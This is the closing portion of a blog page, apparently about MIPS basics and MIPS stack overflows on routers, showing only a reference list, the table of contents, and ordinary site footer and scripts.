+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>《家用路由器0day漏洞挖掘技术》</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6808#toc-8">https://xz.aliyun.com/t/6808#toc-8</a></p>
+</font>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MIPS%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">MIPS汇编基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.1.</span> <span class="toc-text">寄存器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.1.1.</span> <span class="toc-text">通用寄存器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">特殊寄存器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E8%8A%82%E5%BA%8F"><span class="toc-number">1.2.</span> <span class="toc-text">字节序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MIPS%E6%8C%87%E4%BB%A4"><span class="toc-number">1.3.</span> <span class="toc-text">MIPS指令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LOAD-x2F-STORE%E6%8C%87%E4%BB%A4"><span class="toc-number">1.3.1.</span> <span class="toc-text">LOAD/STORE指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E6%8C%87%E4%BB%A4"><span class="toc-number">1.3.2.</span> <span class="toc-text">算术运算指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E6%AF%94%E8%BE%83%E6%8C%87%E4%BB%A4"><span class="toc-number">1.3.3.</span> <span class="toc-text">类比较指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SYSCALL"><span class="toc-number">1.3.4.</span> <span class="toc-text">SYSCALL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%94%AF%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4"><span class="toc-number">1.3.5.</span> <span class="toc-text">分支跳转指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4"><span class="toc-number">1.3.6.</span> <span class="toc-text">跳转指令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">函数调用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MIPS%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">2.</span> <span class="toc-text">MIPS栈溢出</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">3.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/&amp;text=路由器初探之mips基础及mips栈溢出"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/&amp;title=路由器初探之mips基础及mips栈溢出"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/&amp;is_video=false&amp;description=路由器初探之mips基础及mips栈溢出"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=路由器初探之mips基础及mips栈溢出&amp;body=Check out this article: http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/&amp;title=路由器初探之mips基础及mips栈溢出"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/&amp;title=路由器初探之mips基础及mips栈溢出"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/&amp;title=路由器初探之mips基础及mips栈溢出"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/&amp;title=路由器初探之mips基础及mips栈溢出"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/&amp;name=路由器初探之mips基础及mips栈溢出&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/03/23/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%9D%E6%8E%A2%E4%B9%8Bmips%E5%9F%BA%E7%A1%80%E5%8F%8Amips%E6%A0%88%E6%BA%A2%E5%87%BA/&amp;t=路由器初探之mips基础及mips栈溢出"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright ©
+    
+    
+    2021-2023
+    z1r0
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+
+<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
